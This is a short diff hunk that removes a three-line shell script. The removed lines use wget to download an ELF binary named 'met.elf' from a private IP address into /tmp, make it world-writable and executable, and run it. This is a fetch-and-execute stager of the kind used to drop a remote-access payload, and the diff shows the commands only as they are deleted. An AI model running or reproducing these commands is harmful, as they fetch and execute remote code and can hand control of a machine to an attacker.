@@ -1,5 +1,0 @@
-wget http://192.168.140.171/met.elf -O /tmp/met.elf
-chmod 777 /tmp/met.elf
-/tmp/met.elf
-
-
